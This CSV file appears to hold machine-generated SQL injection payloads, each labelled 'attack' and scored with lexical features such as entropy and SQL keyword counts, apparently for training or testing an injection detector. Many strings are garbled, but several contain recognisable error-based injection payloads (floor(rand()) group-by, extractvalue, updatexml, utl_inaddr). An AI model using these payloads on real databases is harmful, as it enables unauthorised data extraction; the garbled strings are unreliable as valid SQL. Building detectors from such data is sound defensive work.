label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%4838%'  =  '   :8382'  =  '*%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,0,38.0,12.0,2.929160830852672,0.0,9.0,15.0,14.0,0.0,0.23684210526315788,0.39473684210526316,0.3684210526315789,4.0,2.0,0.0,0.0,1.0,3.0,0.0,0.0,3.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-CmU>  ||chr  (  >  =  ||coass   (    ,floor  (  select where  1 group AIS.SINMe where whenas from E  (  *2  case   )   from or 3931IT DI||Shruhro  *.5305     having groupelse m 1 from 1 else information_schema"" like ""Gsuit  case   SELECTunadrntsx.r  ( 8382  case whena by 9891  ||chr  end     x   thena 1 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,1,307.0,54.0,4.548290269492958,170.0,22.0,88.0,27.0,0.5537459283387622,0.07166123778501629,0.28664495114006516,0.08794788273615635,0.0,2.0,1.0,0.0,2.0,1.0,0.0,6.0,0.0,1.0,1.0,14.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  "" select whereror.NUe_r.chr  (  )  ||s 1 union 6825 0 unionfrom (  =  a union or 0 from 3074  x,  )  ui,concat  1297  select 1 1  )   )    )   x tre mselect D end  3440   x WHEREE select  ,  )  (  )    9891 from where chr  3074  )   (  )  )    )   )    havingE or  or 4386RthenIs INST 'i'  =2  ||   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,2,509.0,52.0,3.9653194339412505,173.0,66.0,211.0,59.0,0.33988212180746563,0.12966601178781925,0.41453831041257366,0.11591355599214145,2.0,2.0,0.0,0.0,1.0,3.0,0.0,36.0,0.0,1.0,7.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,2.0,1.0,3.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"'harT  (  )  '   )    )   (  ,floor  a  a by  from and ||chr  (  select 1   WHERE 1 do.sT  (  )  =  case 5023_  113  0  4232  *2   (  thenR   select when  (  3440  ||chr  (  (  =  select  DRALIunionSNLMEIShi(  ||chr  (  ||chr  (  (  ||chr  (  *,0x717a767a71~  )     )  ,  mi   x   :.G",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,3,284.0,52.0,4.141927550963402,101.0,28.0,112.0,43.0,0.35563380281690143,0.09859154929577464,0.39436619718309857,0.15140845070422534,2.0,0.0,0.0,0.0,2.0,2.0,0.0,19.0,0.0,1.0,3.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-j  =  *,floor  v2   )     andc concat  select  )  )  h5856  x.,hr  (  =  =  )   thenE7469  -- 0 fromu  (  ,  *2   ,'(  122  )   FROM from group from xun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,4,153.0,42.0,4.046777151928039,57.0,14.0,60.0,22.0,0.37254901960784315,0.0915032679738562,0.39215686274509803,0.1437908496732026,1.0,0.0,3.0,0.0,2.0,3.0,0.0,8.0,0.0,0.0,4.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'   --2   select else INONgecut_ss  1  G 1union DIui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,5,53.0,21.0,3.870894334043007,31.0,4.0,14.0,4.0,0.5849056603773585,0.07547169811320754,0.2641509433962264,0.07547169811320754,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select '5967x or union 6082r  (  ||chr  3326  ,3326)  (  c  (  case when   (  *22   )    )   )     )     WHERE >  (  =  )    unam       and  ||r.achhhr  =  uteun   )    tx.rG(  )and oror D by from from     (  *2   )uax DI.SCLCESSCT DIIThr  (  ,0x717a767a71,floor  (  0x717a767a71hr  =   or,  selectx  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,6,310.0,49.0,4.1875184046662906,115.0,38.0,117.0,40.0,0.3709677419354839,0.12258064516129032,0.3774193548387097,0.12903225806451613,2.0,0.0,0.0,0.0,2.0,3.0,0.0,19.0,0.0,0.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%L7864)    )   thenIT  (  case when  122  ||chr  select 2131  =  ' 0 E1ia   AND mselect t elseuam   FROM  )  select DSend  0n 0 FROM  (  ||chr  (  rand  =  (  =  a,1210  0    concathr  ur  rand  =  0x7171706a71   (  )       )   )    having FROM     select 1 else whena else 1 7158  =  a   (  (  ||Thr  (  having,  rand  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,7,328.0,47.0,4.04650076351225,135.0,37.0,125.0,31.0,0.4115853658536585,0.11280487804878049,0.38109756097560976,0.09451219512195122,1.0,0.0,0.0,0.0,0.0,5.0,0.0,14.0,1.0,0.0,2.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1-' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'     3326  4232  select DNINT p  (  )   -- where by end  0x7171706a71)   x   then )    concat  106  select 9173 AINAUSALS.1210IST  or 1 106  ,0x717a767a71,concat  =  ||chr  (  (    =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,8,467.0,50.0,4.227015272338874,168.0,85.0,163.0,51.0,0.35974304068522484,0.18201284796573874,0.3490364025695932,0.10920770877944326,2.0,0.0,3.0,0.0,2.0,4.0,0.0,25.0,0.0,2.0,7.0,12.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,2.0,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'ytz7881unau'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,9,216.0,31.0,3.90717868316403,76.0,41.0,76.0,23.0,0.35185185185185186,0.18981481481481483,0.35185185185185186,0.10648148148148148,3.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'||  (  select 'Nvgayywun6236a.r  (  having,le  113  (  )    thenchr  =a union group and  ||cxtjunuapar  selectnt  rand  select else  )  ,0x717a767a712in   113  ,concat  case whenz)     select  h from   ((  thenR 0 AND union or d x  selectAND from from )   or FROM    *.chr  (  113  ||chr  ""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""r  3440  )0x717a767a71   FROM   thenIS endin 5584 end,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,10,652.0,54.0,4.345180430618619,280.0,96.0,215.0,61.0,0.4294478527607362,0.147239263803681,0.32975460122699385,0.09355828220858896,2.0,2.0,0.0,0.0,3.0,2.0,0.0,33.0,0.0,0.0,10.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,5.0,0.0,6.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,28.0
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'qo'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,11,237.0,31.0,3.6294454884782428,71.0,37.0,100.0,29.0,0.29957805907172996,0.15611814345991562,0.4219409282700422,0.12236286919831224,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1'||  (  select 'Uvojyun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,12,24.0,17.0,3.8512274809529554,13.0,1.0,5.0,5.0,0.5416666666666666,0.041666666666666664,0.20833333333333334,0.20833333333333334,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1 AND0,1 3785 7158  113   then end  ||chr  (  ||chr  (  select by end  >  )    (  6825 FROM  6237,  0  )   )    )--  )     x 1210  )   --   ,0x717a767a71  )   then from  1   information_schemai  =  ) )     4386,0x717a767a71a)   )    )      (  )    SELECT Z 1 by 0 106  case1adtt_rNrox where 4607 ANDE  =  un   )     )     )  ,  >  ||cu  =  *2   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,13,345.0,51.0,4.0450207593024,100.0,61.0,141.0,43.0,0.2898550724637681,0.17681159420289855,0.40869565217391307,0.1246376811594203,0.0,0.0,4.0,0.0,1.0,3.0,0.0,20.0,0.0,2.0,5.0,16.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,14,305.0,39.0,4.0126707834767465,105.0,55.0,111.0,34.0,0.3442622950819672,0.18032786885245902,0.3639344262295082,0.11147540983606558,2.0,2.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-6055to_rjl  FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,15,18.0,16.0,3.94770277922009,9.0,4.0,3.0,2.0,0.5,0.2222222222222222,0.16666666666666666,0.1111111111111111,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""jyzn1210na   (  ,  select from  113  ||chr  (  ||chr  (  (  0,1   )   from   )  )   113     )    (       ,  ,0x717a767a713326  112  1as x or  x  )   x  )     thenthen by end  6055  =  *2   )   SELECT information_schema  5840  )   select union 1 ore_dr.(  (  = (  ||chr  (  ||chrconcat  (    alereabart 7881 AND 1  (  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,16,519.0,49.0,3.861371493217732,159.0,76.0,218.0,66.0,0.3063583815028902,0.1464354527938343,0.42003853564547206,0.12716763005780346,0.0,2.0,0.0,0.0,2.0,3.0,0.0,37.0,0.0,2.0,8.0,15.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,0.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"11""O",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,17,4.0,3.0,1.5,1.0,2.0,0.0,1.0,0.25,0.5,0.0,0.25,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'b6270To""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'jp3775' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'_  =  ||chr  (  (  ||chr  (  =  r  '   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ' and  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,18,1393.0,47.0,3.9747349715265914,428.0,239.0,544.0,182.0,0.3072505384063173,0.1715721464465183,0.3905240488155061,0.1306532663316583,8.0,2.0,0.0,0.0,4.0,10.0,0.0,102.0,0.0,4.0,22.0,42.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,15.0,6.0,1.0,4.0,7.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,39.0
attack,"1""7469  4232  5023, 3440  )   x0x717a767a71,floor  =  a,      (  ||chr  (  ,0x717a767a71un or 4386  4493  --  )     thenIT(  0  >  floor  e  uayssx.gs LINUEe  (   7469  ||chr  (  )   (  SELECT else concat  (  ||chr  (  =  )  case ||  (  (  ~  )   )    or 1 when SELECT then else 1x when   then (  *  select    4607    )   from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19,326.0,47.0,4.15657684929557,111.0,54.0,122.0,39.0,0.34049079754601225,0.1656441717791411,0.37423312883435583,0.1196319018404908,0.0,1.0,2.0,0.0,1.0,2.0,0.0,18.0,0.0,0.0,4.0,14.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%-T  = 4510  =  ,  0  (  )   )       x   xup from ,1a where andhr  FROM=  (  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20,79.0,30.0,3.5647685638933857,24.0,7.0,36.0,12.0,0.3037974683544304,0.08860759493670886,0.45569620253164556,0.1518987341772152,0.0,0.0,1.0,0.0,0.0,3.0,0.0,4.0,1.0,0.0,2.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""58400x7171706a71,2_drts.r  (  =  )   ,0x717a767a71nr  SELECT DISNNhr  r  casechr  (  =  ,,floor  (    )  ||chr  (  (  select hr  (  113  >  4232  113  =  )  SELECT  1 DIINNCTM 1INCT  (  1045,1   2nt  (  chr  chr  rand  ||chr  (  case when   (  ||r  -(  )  (     6825)   )   )     )  union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21,489.0,50.0,3.930442322115868,142.0,78.0,203.0,66.0,0.2903885480572597,0.15950920245398773,0.41513292433537835,0.13496932515337423,0.0,2.0,1.0,0.0,1.0,4.0,0.0,38.0,1.0,1.0,9.0,13.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"-3775o  113  ,floor  (  (     )  ||chr  ||rr  (hr  t  6825  4232  case )   )  =    ,floor  (  ANDfounu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22,102.0,30.0,3.71459463406317,31.0,15.0,41.0,15.0,0.30392156862745096,0.14705882352941177,0.4019607843137255,0.14705882352941177,0.0,0.0,1.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,2.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'a x group concat  3440  ||Ech0x717a767a71.gTehr  t  (  (  select  AcU  ,1   fromIx.cShr  (  8190  )1392T  4386  (  ||chr  0x7171706a71,1  *2   )    2131x dr   (  0   concat  ||U.counr  (  )    having elseINSONne LIvudnthr  (  0x7171706a71  )  ||chr  tr  (  (  case 113  113  case wheniaNC else WHERE by",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23,521.0,55.0,4.268950160709676,194.0,96.0,179.0,52.0,0.3723608445297505,0.18426103646833014,0.3435700575815739,0.09980806142034548,1.0,2.0,0.0,0.0,1.0,1.0,0.0,29.0,0.0,0.0,7.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'i  4386  )     )    )   or )     106  ||crounaxesAsselect  Dx mx  )     )   --2e end   )    (  ,0x717a767a71,0x717a767a71 from dur  (  )  )    )   x union 0 1x   )   )   thenx when where end  )   x ayCT  )     )   )  =a  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24,224.0,38.0,3.6277569544217307,71.0,29.0,97.0,27.0,0.3169642857142857,0.12946428571428573,0.4330357142857143,0.12053571428571429,1.0,0.0,2.0,0.0,0.0,1.0,0.0,19.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""g__rhxul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25,522.0,41.0,3.9441491490159084,176.0,91.0,197.0,58.0,0.3371647509578544,0.1743295019157088,0.3773946360153257,0.1111111111111111,2.0,2.0,0.0,0.0,2.0,2.0,0.0,36.0,0.0,2.0,11.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1'||  (  select 'yysyys"" like ""_sxjbh'  =  'yfxl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26,48.0,21.0,3.893854932309197,25.0,1.0,11.0,11.0,0.5208333333333334,0.020833333333333332,0.22916666666666666,0.22916666666666666,4.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||')        then  1x  ,  case when 8190   )    )' like ' FROM 4493  )  case :u  tabhraysuarsxaetr  (  ||chq  0  select     0x7171706a71,concat  3326  ,floor  =  3440  )   =  3074  ) from WHERE 1 AND concat  =  ,   )    4232   (  )   4386  || 0 1 by a or union selectccast FROM FROM (0x717a767a712   ax fromfrom 3931 or (  ||meuadr_  (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27,504.0,51.0,4.284372867958446,172.0,104.0,174.0,54.0,0.3412698412698413,0.20634920634920634,0.34523809523809523,0.10714285714285714,5.0,0.0,0.0,0.0,0.0,5.0,0.0,24.0,0.0,1.0,10.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,2.0,4.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
